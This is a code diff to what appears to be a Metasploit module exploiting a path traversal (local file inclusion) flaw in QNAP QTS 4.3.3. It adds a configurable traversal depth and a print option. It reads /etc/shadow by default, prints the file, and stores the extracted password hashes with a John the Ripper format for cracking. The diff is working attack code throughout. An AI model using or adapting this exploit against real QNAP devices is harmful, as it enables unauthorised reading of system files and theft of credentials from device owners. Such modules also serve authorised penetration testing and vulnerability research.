@@ -43,7 +43,9 @@ This module has been tested with QNAP QTS 4.3.3
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [ true, 'The URI of the QNAP Website', '/']),
-        OptString.new('FILEPATH', [ true, 'The file to read on the target', '/etc/shadow'])
+        OptString.new('FILEPATH', [ true, 'The file to read on the target', '/etc/shadow']),
+        OptBool.new('PRINT', [ true, 'Whether or not to print the content of the file', true]),
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 3 ])
       ]
     )
   end
@@ -58,8 +60,7 @@ This module has been tested with QNAP QTS 4.3.3
         'album' => album_id,
         'a' => 'caption',
         'ac' => access_code,
-        # just ./../ should get to the root of the filesystem, adding more just in case
-        'filename' => './' + (file_path.start_with?('/') ? '../../../../../../..' + file_path : file_path)
+        'filename' => '.' + (file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : '/' + file_path)
       }
     })
     if res && res.code == 200
@@ -163,15 +164,11 @@ This module has been tested with QNAP QTS 4.3.3
       file_content,
       fname
     )
+	
+	print_good("File download successful, saved in #{path}")
     
-    print_good("====================== LFI successful ======================")
-    
-    puts file_content
-    
-    print_good("============================================================")
-    
-    print_good("File download successful, file saved in #{path}")
-    
+    print_good("File content:\n" + file_content) if datastore['PRINT']
+
     return unless datastore['FILEPATH'] == '/etc/shadow'
     
     print_status("adding the /etc/shadow entries to the database")
@@ -188,11 +185,12 @@ This module has been tested with QNAP QTS 4.3.3
           port: datastore['RPORT'],
           service_name: 'QNAP',
           protocol: 'http',
-          module_fullname: 'qnap_lfi',
+          module_fullname: self.fullname,
           workspace_id: myworkspace_id,
           post_reference_name: self.fullname,
           username: entries[0],
           private_data: entries[1],
+          jtr_format: identify_hash(entries[1]),
           private_type: :nonreplayable_hash
         }
     
